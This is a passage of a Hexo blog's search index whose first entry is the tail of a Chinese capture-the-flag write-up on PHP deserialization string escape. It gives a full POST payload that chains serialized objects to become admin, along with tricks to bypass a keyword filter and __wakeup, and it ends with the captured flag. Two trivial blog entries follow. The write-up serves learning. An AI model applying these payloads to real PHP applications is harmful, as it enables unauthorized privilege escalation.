=your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{s:8:"username";O:6:"level2":1:{s:8:"username";O:6:"level3":1:{s:8:"username";s:5:"admin";}}}<hr />check不允许匹配到"username"字符串<p>于是准备绕过<br>类型的字符S使用大写<br>u=\75</p><hr />level2中有__wakeup()方法，于是绕过<pre><code>O:6:"level2":2</code></pre>例如本题，<pre><code>O:7:"someone":3:&#123;s:12:"uuuuuuyour_name";s:60:"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu";s:12:"uuuuuuyour_pass";s:53:"AA";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;";s:8:"uuuuuuadmin";i:0;&#125;</code></pre>我们有u x60，最后换成字符30个，于是反序列化会继续向下读取<pre><code>s:60:"**********";s:12:"*your_pass";s:53:"AA    |（到此为止）</code></pre>然后"正常闭合，这样接下来就会读取我们构造的字符串，字符串成功逃逸<pre><code>";s:12:"uuuuuuyour_pass";s:2:"AA";s:5:"admin";i:1;&#125;|（到此为止）</code></pre>下面无用了，因为}正常闭合，反序列化结束<pre><code>";s:8:"uuuuuuadmin";i:0;&#125;</code></pre>以上是admin的方法，取flag原理方法同上<h3>最终</h3>payload =your[name.able=uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu&your[pass.able=A";s:12:"uuuuuuyour_pass";O:6:"level1":1:{S:8:"\75sername";O:6:"level2":2:{S:8:"\75sername";O:6:"level3":1:{S:8:"\75sername";s:5:"admin";}}}<p>再访问./guest.php解决</p><p>问题解决：s3c{NEJHdTBFaWJtekd5QFptRXZiTERTVW5rRTE4UDZrRio}</p><h5>小结：</h5>字符串逃逸字符个数<strong>一定</strong>要算好！（吐血]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> Git泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="article/Hello%20World/"/>
      <url>article/Hello%20World/</url>
      
        <content type="html"><![CDATA[<p>hello</p><a id="more"></a><p>这是新建静态博客的第一篇文章、</p><p>这已经是第三次搭博客了…</p><p>马上搬运原文章来，记得做好备份QAQ</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux大作业</title>
      <link href="article/linuxprogramme/"/>
      <url>article/linuxprogramme/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码不太对，别想骗窝." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="edac3b509459ea1dde7ac6095ed87608f52380468230b537be259dc1e243314a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-blink">      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="这里需要密码查看哦.">这里需要密码查看哦.</span>      </label>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Programme </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
